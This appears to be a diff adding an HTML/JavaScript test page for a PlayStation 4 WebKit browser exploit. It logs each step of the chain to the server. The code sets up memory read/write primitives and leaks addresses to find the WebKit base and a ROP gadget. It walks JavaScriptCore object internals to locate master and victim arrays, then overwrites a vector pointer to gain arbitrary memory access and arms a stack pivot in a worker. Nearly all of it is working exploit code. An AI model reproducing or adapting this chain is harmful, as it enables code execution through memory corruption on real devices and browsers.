@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>ps4 trace 4 - single worker</title>
+<style>
+  html,body{margin:0;background:#0b0d10;color:#c8ced8;font:14px/1.45 monospace;}
+  #wrap{padding:16px;}
+  #state{font-size:22px;font-weight:700;margin:0 0 10px;}
+  #out{white-space:pre-wrap;background:#11151b;border:1px solid #1e2732;
+       border-radius:5px;padding:10px 12px;height:calc(100vh - 100px);
+       overflow-y:auto;}
+  .ok{color:#7fd0a0;} .bad{color:#d08a7f;} .warn{color:#d8c07f;}
+</style>
+</head>
+<body>
+<div id="wrap">
+  <div id="state">trace 4 - single worker</div>
+  <div id="out"></div>
+</div>
+<script type="module">
+import { establishPrimitive } from "./core.js?v=trace1";
+import { installWindowP } from "./mem.js?v=trace1";
+import { offsetsFor } from "./ps4_offsets.js";
+
+const outEl = document.getElementById("out");
+const stateEl = document.getElementById("state");
+const lines = [];
+function log(t, d) {
+    const s = t + (d ? "  " + d : "");
+    lines.push(s);
+    outEl.textContent = lines.join("\n");
+    outEl.scrollTop = outEl.scrollHeight;
+    try {
+        const x = new XMLHttpRequest();
+        x.open("POST", "t", true);
+        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        x.send("TRACE4&tag=" + encodeURIComponent(t) + "&detail=" + encodeURIComponent(d||""));
+    } catch(e){}
+}
+function state(t,c){ stateEl.textContent=t; stateEl.className=c||""; }
+function ptrish(v) { return v && v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0; }
+
+let theWorker = null;
+
+(async function(){
+    try {
+        const { key, off } = offsetsFor(navigator.userAgent);
+        log("T4-FW", key + " " + (off ? "off found" : "NO OFF"));
+
+        state("STEP 1: primitive");
+        const carrier = await establishPrimitive({
+            maxAttempts: 3,
+            onEvent: function(tag, detail, attempt) {
+                log("PRIM:" + tag, (attempt != null ? "["+attempt+"] " : "") + (detail || ""));
+            }
+        });
+        installWindowP(carrier, { promote: false });
+        const p = window.p;
+        log("T4-PRIM-OK", "window.p ready");
+        state("STEP 1 OK", "ok");
+        await new Promise(r => setTimeout(r, 300));
+
+        function bufAddr(ab) {
+            const c = p.leakval(ab);
+            return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
+                .add32(off.wk_ArrayBuffer_m_contents_m_data));
+        }
+
+        // Recolectar los gadgets que el worker necesita (los mismos de chain_poops)
+        // Solo necesitamos G0 para armPivot
+        const cell = p.leakval(Math.expm1);
+        const nativeFn = p.read8(p.read8(cell.add32(0x18))
+            .add32(off.wk_JSFunction_m_function));
+        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
+        const G0 = webkitBase.add32(off.wk_MOV_RDI_RSI_30_CALL);
+        log("T4-G0", "G0=" + G0);
+        state("STEP 2 OK", "ok");
+        await new Promise(r => setTimeout(r, 300));
+
+        state("STEP 3: create Worker");
+        log("T4-3-A", "new Worker('rpc_worker.js')");
+        theWorker = new Worker("rpc_worker.js");
+        log("T4-3-B", "worker created");
+        await new Promise(r => setTimeout(r, 300));
+
+        // RPC mínimo
+        let seq = 0;
+        const pending = new Map();
+        theWorker.onmessage = function (e) {
+            const d = e.data || {};
+            const slot = pending.get(d.id);
+            if (!slot) return;
+            pending.delete(d.id);
+            if (slot.timer) clearTimeout(slot.timer);
+            if (d.type === "err") slot.reject(new Error(String(d.value)));
+            else slot.resolve(d.value);
+        };
+        theWorker.onerror = function(e){
+            log("T4-WORKER-ERROR", (e && e.message) ? e.message : "?");
+        };
+        function call(fname, timeoutMs, ...args) {
+            return new Promise(function (resolve, reject) {
+                const id = seq++;
+                const timer = timeoutMs > 0 ? setTimeout(function () {
+                    pending.delete(id);
+                    reject(new Error("timeout " + fname));
+                }, timeoutMs) : null;
+                pending.set(id, { resolve, reject, timer });
+                theWorker.postMessage({ id: id, name: fname, args: args });
+            });
+        }
+
+        log("T4-4-A", "ping");
+        const pong = await call("ping", 5000);
+        log("T4-4-B", "ping -> " + pong);
+        state("STEP 4 OK", "ok");
+        await new Promise(r => setTimeout(r, 300));
+
+        log("T4-5-A", "init(0x10100000, 0xc0de0000)");
+        const arr = await call("init", 10000, 0x10100000, 0xc0de0000);
+        log("T4-5-B", "init returned, arr=" + arr);
+        state("STEP 5 OK", "ok");
+        await new Promise(r => setTimeout(r, 300));
+
+        log("T4-6-A", "bufAddr(arr.buffer)");
+        const D = bufAddr(arr.buffer);
+        log("T4-6-B", "D=" + D);
+        const tag = p.read4(D) >>> 0;
+        log("T4-6-C", "D[0]=0x" + tag.toString(16)
+            + (tag === 0x10100000 ? " OK" : " WRONG"));
+        state("STEP 6 OK", "ok");
+        await new Promise(r => setTimeout(r, 300));
+
+        log("T4-7-A", "read8(D+0x10) [storage]");
+        const storage = p.read8(D.add32(0x10));
+        log("T4-7-B", "storage=" + storage + " ptrish=" + ptrish(storage));
+        await new Promise(r => setTimeout(r, 300));
+
+        log("T4-8-A", "read8(storage+8) [marker cell]");
+        const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
+        log("T4-8-B", "mc=" + mc + " ptrish=" + ptrish(mc));
+        state("STEP 8 OK", "ok");
+        await new Promise(r => setTimeout(r, 300));
+
+        log("T4-9-A", "read8(mc+8) [butterfly]");
+        const bf = p.read8(mc.add32(8));
+        log("T4-9-B", "bf=" + bf + " ptrish=" + ptrish(bf));
+        await new Promise(r => setTimeout(r, 300));
+
+        state("STEP 10: walk butterfly slots");
+        let wm = null, wv = null, wl = null;
+        for (let k = 1; k <= 8; ++k) {
+            log("T4-10-" + k + "-A", "read8(bf - " + (8*k) + ")");
+            const val = p.read8(bf.sub32(8 * k));
+            log("T4-10-" + k + "-B", "val=" + val + " ptrish=" + ptrish(val));
+            if (!ptrish(val)) continue;
+            const inl = p.read8(val.add32(0x10));
+            const len = p.read4(val.add32(0x18)) >>> 0;
+            log("T4-10-" + k + "-C", "inl=" + inl + " len=0x" + len.toString(16));
+            if (inl.hi === 0 && inl.low === 2) {
+                log("T4-10-" + k + "-LEAK", "identified");
+                if (!wl) wl = val;
+            }
+            else if (inl.hi > 0 && len === 6) {
+                log("T4-10-" + k + "-MASTER", "identified");
+                if (!wm) wm = val;
+            }
+            else if (inl.hi > 0 && len === 0x30) {
+                log("T4-10-" + k + "-VICTIM", "identified");
+                if (!wv) wv = val;
+            }
+            await new Promise(r => setTimeout(r, 50));
+        }
+        log("T4-10-FOUND", "master=" + wm + " victim=" + wv + " leak=" + wl);
+        state("STEP 10 " + ((wm&&wv&&wl) ? "OK" : "MISS"), (wm&&wv&&wl) ? "ok" : "bad");
+        await new Promise(r => setTimeout(r, 300));
+
+        if (!(wm && wv && wl)) {
+            log("T4-ABORT", "shapes not found, stopping here");
+            state("DONE - shapes missing", "warn");
+            return;
+        }
+
+        state("STEP 11: read master.m_vector, write8");
+        log("T4-11-A", "read8(wm+0x10) [origVector]");
+        const origVector = p.read8(wm.add32(0x10));
+        log("T4-11-B", "origVector=" + origVector);
+        await new Promise(r => setTimeout(r, 300));
+
+        log("T4-11-C", "write8(wm+0x10, wv) [the wire]");
+        p.write8(wm.add32(0x10), wv);
+        log("T4-11-D", "write8 returned");
+        await new Promise(r => setTimeout(r, 300));
+
+        log("T4-11-E", "readback read8(wm+0x10)");
+        const wired = p.read8(wm.add32(0x10));
+        log("T4-11-F", "wired=" + wired
+            + (wired.low === wv.low && wired.hi === wv.hi ? " MATCH" : " MISMATCH"));
+        state("STEP 11 OK", "ok");
+        await new Promise(r => setTimeout(r, 300));
+
+        log("T4-12-A", "call setup(" + wl.low + ", " + wl.hi + ")");
+        await call("setup", 10000, wl.low, wl.hi);
+        log("T4-12-B", "setup returned OK");
+        state("STEP 12 OK", "ok");
+        await new Promise(r => setTimeout(r, 300));
+
+        log("T4-13-A", "call armPivot(G0)");
+        const armResult = await call("armPivot", 10000, G0.low, G0.hi);
+        log("T4-13-B", "armPivot returned " + JSON.stringify(armResult));
+        state("STEP 13 OK", "ok");
+        await new Promise(r => setTimeout(r, 300));
+
+        state("STEP 14: fire(getpid)");
+        log("T4-14-A", "call fire with a tiny chain? -- skipping, need ctx");
+        log("T4-14-B", "instead, verify the worker responds to ping");
+        const p2 = await call("ping", 5000);
+        log("T4-14-C", "ping after armPivot -> " + p2);
+        state("STEP 14 OK", "ok");
+
+        state("DONE - SINGLE WORKER SURVIVED", "ok");
+        log("T4-DONE", "one worker went all the way through armPivot "
+            + "without crashing. If chain_poops crashes with 12 workers, "
+            + "the bug is in the LOOP or in the ctx allocation, not in "
+            + "the worker code itself.");
+    } catch (e) {
+        log("T4-THREW", (e && e.message) ? e.message : String(e));
+        log("T4-STACK", e && e.stack ? String(e.stack).slice(0,300) : "");
+        state("FAILED - see log", "bad");
+    }
+    // Cleanup
+    if (theWorker) {
+        try { theWorker.postMessage({id: 9999, name: "release", args: []}); } catch(e){}
+        try { theWorker.terminate(); } catch(e){}
+    }
+})();
+</script>
+</body>
+</html>
